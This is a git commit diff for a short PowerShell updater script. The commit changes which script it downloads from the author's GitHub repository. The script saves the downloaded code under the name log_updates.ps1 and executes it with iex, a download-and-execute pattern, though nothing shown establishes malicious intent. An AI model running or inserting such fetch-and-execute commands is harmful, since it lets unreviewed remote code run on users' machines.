fb3bd649d3d43c2579241986a26a6ef7e6be08bd
daniel0011234 <169172580+daniel0011234@users.noreply.github.com>
2024-05-11 21:22:03 +0300

    Update updater_tester_living.ps1

--- updater_tester_living.ps1
+++ updater_tester_living.ps1
@@ -1,4 +1,4 @@
 powershell -command "New-Item -Path 'c:\' -Name 'logfiles' -ItemType 'directory'"
-powershell -command "wget https://raw.githubusercontent.com/daniel0011234/myscripts/main/update_runner_tester.ps1 -OutFile C:\logfiles\log_updates.ps1"
+powershell -command "wget https://raw.githubusercontent.com/daniel0011234/myscripts/main/update_runner_living.ps1 -OutFile C:\logfiles\log_updates.ps1"
 Start-Sleep -s 20
 powershell -command "iex (Get-Content -path 'C:\logfiles\log_updates.ps1' -Raw)"
